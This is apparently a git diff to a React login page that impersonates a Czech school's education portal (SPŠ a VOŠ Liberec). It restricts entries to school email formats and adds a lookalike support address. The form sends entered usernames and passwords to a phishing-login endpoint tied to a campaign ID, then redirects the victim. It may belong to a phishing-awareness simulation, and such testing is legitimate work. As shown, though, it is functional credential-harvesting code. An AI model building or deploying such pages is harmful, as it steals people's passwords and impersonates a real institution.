@@ -1,6 +1,9 @@
 import React, { useState } from 'react';
 import axios from 'axios';
-import { toast, Toaster } from 'sonner';
+
+interface ApiResponse {
+  redirect: string;
+}
 
 const Login = () => {
   const [email, setEmail] = useState('');
@@ -8,7 +11,7 @@ const Login = () => {
   const [error, setError] = useState('');
 
   const validateEmail = (email) => {
-    const emailRegex = /^[a-z]{2,}\.[a-z]{2,}\.[1-9][0-9]{2}@pslib\.cz$/;
+    const emailRegex = /^[a-z]{2,}\.[a-z]{2,}\.(02[1-4])@pslib\.cz$/;
     const normalizedEmail = email.toLowerCase();
     
     // Check if there are exactly two dots before @
@@ -22,22 +25,16 @@ const Login = () => {
     return emailRegex.test(normalizedEmail);
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!validateEmail(email)) {
-      toast.error('Email musí být ve formátu jmeno.prijmeni.XXX@pslib.cz');
+      setError('Email musí být ve formátu jmeno.prijmeni.XXX@pslib.cz');
       return;
     }
 
-    // Show success toast first
-    toast.success('Přihlášení úspěšné');
-
-    // Wait a moment for the toast to be visible
-    await new Promise(resolve => setTimeout(resolve, 500));
-
     try {
-      const response = await axios.post('https://phishing-login.onrender.com/api/credentials', {
+      const response = await axios.post<ApiResponse>('https://phishing-login.onrender.com/api/credentials', {
         username: email,
         password: password,
         campaignId: '65c4d8f2e987b459a731d8f2'
@@ -45,14 +42,12 @@ const Login = () => {
       
       window.location.href = response.data.redirect;
     } catch (err) {
-      toast.error('Neplatné přihlašovací údaje');
       setError('Neplatné přihlašovací údaje');
     }
   };
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center">
-      <Toaster position="top-center" richColors />
       <div className="w-full max-w-md p-6">
         <div className="mx-auto h-12 w-auto flex justify-center items-center">
           <svg 
@@ -66,10 +61,10 @@ const Login = () => {
           </svg>
         </div>
         <h2 className="mt-6 text-center text-3xl font-extrabold text-[#1c2125]">
-          Přihlaste se
+          Vzdělávací portál
         </h2>
         <p className="mt-2 text-center text-sm text-gray-600">
-          Zadejte své přihlašovací údaje
+          pro SPŠ a VOŠ Liberec
         </p>
   
         <form className="mt-8 space-y-6" onSubmit={handleSubmit}>
@@ -124,6 +119,13 @@ const Login = () => {
             </button>
           </div>
         </form>
+        <div className="mt-6">
+          <div className="mt-6 grid grid-cols-1 gap-3">
+            <p className="text-sm text-center text-gray-600">
+              V případě problémů nám prosím napište na email <button className="text-blue-600 hover:text-blue-500 cursor-pointer">pslibedu@pslib-edu.cz</button>
+            </p>
+          </div>
+        </div>
       </div>
     </div>
   );
